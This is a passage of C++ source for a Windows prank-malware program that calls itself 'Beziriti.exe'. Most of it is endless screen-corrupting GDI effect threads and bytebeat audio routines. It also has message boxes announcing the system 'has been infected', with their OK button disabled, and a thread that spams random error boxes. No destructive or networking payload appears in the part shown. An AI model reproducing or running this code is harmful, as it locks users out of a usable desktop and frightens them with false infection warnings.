    #define FUNCTION(v, maxv) ( abs( v ) / ( maxv ) % 2 ? ( maxv ) - abs( v ) % ( maxv ) : abs( v ) % ( maxv ) );
    *x = FUNCTION(*x, w - 1);
    *y = FUNCTION(*y, h - 1);
    #undef FUNCTION
}

DWORD WINAPI gdi1(LPVOID lpParam) {
    float hWnd;
    int x;
    int y;
    int i;
    HDC hdcSrc;
    HBITMAP h;
    int v7;
    int cy;
    int v9;
    int SystemMetrics;
    int v11;
    HDC hdca;
    HDC hdc;
    hdca = GetDC(0);
    SystemMetrics = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    v7 = 0;
    h = CreateCompatibleBitmap(hdca, SystemMetrics, cy);
    hdcSrc = CreateCompatibleDC(hdca);
    SelectObject(hdcSrc, h);
    while (1) {
        hdc = GetDC(0);
        v11 = GetSystemMetrics(0);
        v9 = GetSystemMetrics(1);
        for (i = 0; i <= 19; ++i) {
            ++v7;
            BitBlt(hdcSrc, 0, 0, v11, v9, hdc, 0, 0, SRCCOPY);
            for (y = 0; y < v9; ++y) {
                hWnd = (double)y / 30.0 * (double)v7;
                x = (int)(FastSine(hWnd) * 50.0);
                BitBlt(hdcSrc, x, y, v11, 1, hdcSrc, 0, y, SRCCOPY);
            }
            InitializeTan();
            BitBlt(hdc, 0, 0, v11, v9, hdcSrc, 0, 0, SRCCOPY);
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI blur2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(dcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    srand((unsigned int)time(NULL));

    while (1) {
        hdc = GetDC(NULL);
        int x = rand() % w;
        int y = rand() % h;
        int dx = (rand() % 3) - 1;
        int dy = (rand() % 3) - 1;
        BitBlt(dcCopy, x + dx, y + dy, w - x, h - y, hdc, x, y, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}

DWORD WINAPI icons2(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);
        HMODULE hModule = LoadLibrary(TEXT("shell32.dll"));
        int randomIcon = rand() % (250 - 50 + 1) + 50;
        HICON hIcon = LoadIcon(hModule, MAKEINTRESOURCE(randomIcon));
        ICONINFO iconInfo;
        GetIconInfo(hIcon, &iconInfo);
        BITMAP bmpIcon;
        GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmpIcon);
        int iconWidth = bmpIcon.bmWidth;
        int iconHeight = bmpIcon.bmHeight;
        DrawIconEx(hdc, rand() % x, rand() % y, hIcon, iconWidth * (rand() % 6 + 1), iconHeight * (rand() % 6 + 1), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
        FreeLibrary(hModule);
    }
}

DWORD WINAPI shader8(LPVOID lpParam) {
    HDC desk = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biWidth = sw;
    bmi.bmiHeader.biHeight = sh;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;
    RGBTRIPLE* rgbtriple = NULL;
    int radius = 17;
    double angle = 0;
    while (1) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, NULL, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sh;
            rgbtriple[i].rgbtRed += x ^ y;
            rgbtriple[i].rgbtGreen += x ^ y;
            rgbtriple[i].rgbtBlue += x ^ y;
        }
        int x = (int)(cos(angle) * radius);
        int y = (int)(sin(angle) * radius);
        BitBlt(desk, 0, 0, sw, sh, deskMem, x, y, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk);
        DeleteDC(deskMem);
        DeleteObject(scr);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
}

DWORD WINAPI shader9(LPVOID lpParam) {
    HDC desk = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biWidth = sw;
    bmi.bmiHeader.biHeight = sh;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;
    RGBTRIPLE* rgbtriple = NULL;
    int radius = 27;
    double angle = 0;
    while (1) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, NULL, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            rgbtriple[i].rgbtRed *= 5;
            rgbtriple[i].rgbtGreen *= 5;
            rgbtriple[i].rgbtBlue *= 5;
        }
        int x = (int)(cos(angle) * radius);
        int y = (int)(sin(angle) * radius);
        BitBlt(desk, 0, 0, sw, sh, deskMem, x, y, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk);
        DeleteDC(deskMem);
        DeleteObject(scr);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
        Sleep(1);
    }
}

DWORD WINAPI invcc(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    HDC hdc = GetDC(0);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
    HDC hdcTemp = CreateCompatibleDC(hdc);
    SelectObject(hdcTemp, hbmTemp);
    int radius = 100;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (1) {
        hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 4), centerY = origY - (h / 4);
        x = (int)(cos(angle) * radius) + centerX;
        y = (int)(sin(angle) * radius) + centerY;
        for (INT i = 64; i > 8; i -= 8) {
            HRGN circle = CreateEllipticRgn(50 + x - i + xf, 50 + y - i + yf, 100 + x + i + xf, 100 + y + i + yf);
            InvertRgn(hdc, circle);
            DeleteObject(circle);
        }
        angle = fmod(angle + M_PI / radius, M_PI * radius);
        Sleep(1);
        if (yf == 0) {
            signY = 5;
        }
        if (xf == 0) {
            signX = 15;
        }
        if (yf >= GetSystemMetrics(1)) {
            signY -= 5;
        }
        if (xf >= GetSystemMetrics(0)) {
            signX -= 15;
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI gradient1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int xf = 0;
    int yf = 0;
    int signX = 15;
    int signY = 5;
    HDC hdc = GetDC(0);
    HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
    HDC hdcTemp = CreateCompatibleDC(hdc);
    SelectObject(hdcTemp, hbmTemp);
    int radius = 100;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (1) {
        hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 4), centerY = origY - (h / 4);
        x = (int)(cos(angle) * radius) + centerX;
        y = (int)(sin(angle) * radius) + centerY;
        for (INT i = 64; i > 8; i -= 8) {
            TRIVERTEX vertex[2];
            vertex[0].x = 50 + x - i + xf;
            vertex[0].y = 50 + y - i + yf;
            vertex[0].Red = 0x0000;
            vertex[0].Green = 0xd000;
            vertex[0].Blue = 0x8d00;
            vertex[0].Alpha = 0x0000;
            vertex[1].x = 100 + x + i + xf;
            vertex[1].y = 100 + y + i + yf;
            vertex[1].Red = 0x0000;
            vertex[1].Green = 0xdd00;
            vertex[1].Blue = 0xd800;
            vertex[1].Alpha = 0x0000;
            GRADIENT_RECT gRect;
            gRect.UpperLeft = 0;
            gRect.LowerRight = 1;
            GradientFill(hdc, vertex, 2, &gRect, 1, GRADIENT_FILL_RECT_H);
        }
        angle = fmod(angle + M_PI / radius, M_PI * radius);
        Sleep(1);
        if (yf == 0) {
            signY = 5;
        }
        if (xf == 0) {
            signX = 15;
        }
        if (yf >= GetSystemMetrics(1)) {
            signY -= 5;
        }
        if (xf >= GetSystemMetrics(0)) {
            signX -= 15;
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI radialRGB(LPVOID lpParam) {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int radius = 25;
    double angle = 0;
    srand((unsigned int)time(NULL));
    while (1) {
        HDC hdc = GetDC(0);
        int x = (int)(cos(angle) * radius);
        int y = (int)(sin(angle) * radius);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCCOPY);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(1);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
}

DWORD WINAPI shader10(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    srand((unsigned int)time(NULL));
    while (1) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb ^= (rand() % 0x100) * 0x010101;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader11(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    while (1) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb ^= x | y | i ^ i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader12(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt((double)(x + y)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

HHOOK hHook = NULL;

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND hDlg = (HWND)wParam;
        HWND hBtnWnd = GetDlgItem(hDlg, IDOK);
        if (hBtnWnd != NULL)
            EnableWindow(hBtnWnd, FALSE);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI msgbox(LPVOID lpParam) {
    hHook = SetWindowsHookEx(WH_CBT, &CBTProc, NULL, GetCurrentThreadId());
    MessageBox(NULL, TEXT("Your system has been infected by Beziriti.exe, goodluck!"), TEXT("Beziriti.exe by VietNamLover"), MB_ICONINFORMATION);
    if (hHook != NULL)
        UnhookWindowsHookEx(hHook);
    return 0;
}

DWORD WINAPI msgbox1(LPVOID lpParam) {
    hHook = SetWindowsHookEx(WH_CBT, &CBTProc, NULL, GetCurrentThreadId());
    MessageBox(NULL, TEXT("Last payload incoming..."), TEXT("Beziriti.exe by VietNamLover"), MB_ICONINFORMATION);
    if (hHook != NULL)
        UnhookWindowsHookEx(hHook);
    return 0;
}

DWORD WINAPI shader13(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    while (1) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += x + y ^ i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI last(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    SelectObject(hdcMem, hbmTemp);
    srand((unsigned int)time(NULL));
    while (1) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rand() % 0x100) * 0x010101;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

LPCSTR generateRandomString(int len) {
    char* ustr = new char[len + 1];
    for (int i = 0; i < len; i++) {
        ustr[i] = (char)((rand() % 26) + 65);
    }
    ustr[len] = '\0';
    return ustr;
}

DWORD WINAPI msg(LPVOID lpParam) {
    MessageBox(NULL, generateRandomString(rand() % 10 + 10), generateRandomString(rand() % 10 + 10), MB_ICONERROR);
    return 0;
}

DWORD WINAPI MsgSpamThread(LPVOID lpParam) {
    srand((unsigned int)time(NULL));
    while (1) {
        CreateThread(0, 0, msg, 0, 0, 0);
        Sleep(rand() % 1000);
    }
    return 0;
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> (t & 8191 ? 4 : 5) | t * (t >> 5 & t >> 7) | t * (t >> 4 & t >> 5 | t >> 9) & 145 | (t + t >> t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 & t >> 8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 2 & t >> 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 3 & t >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 7 & t >> 11));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 4 & t >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 12 & 12 ^ 2 | t >> 9 & 9) | t >> 2 | 30000 / (t % 4096 + 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(5 * (t + (t ^ t >> 7) ^ 5) | 19 * ((2 * t >> 10) | (15 * t >> 4)) & ((7 * t >> 10) / 2) * t * ((t >> 9 | t >> 13) & 15) & 129 | t * ((t >> 9 | 3) & 25 & t >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 6 | t >> ((t >> 7) & (t >> 11))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 6 | t >> ((t >> 7) & (t ^ 11))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t ^ 6 & t >> ((t >> 7) & (t ^ 11))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t ^ 6 & t >> (t & 166 & t ^ 12)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
